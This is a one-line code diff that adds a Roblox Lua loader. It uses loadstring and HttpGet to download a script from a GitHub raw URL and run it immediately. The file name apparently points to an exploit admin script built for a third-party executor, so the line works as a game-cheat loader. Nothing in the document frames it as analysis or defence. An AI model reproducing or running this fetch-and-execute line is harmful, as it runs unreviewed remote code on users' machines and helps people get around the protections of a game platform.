@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LynoForWindows/scripts/main/Infiniteyieldworkswithwave.lua"))()
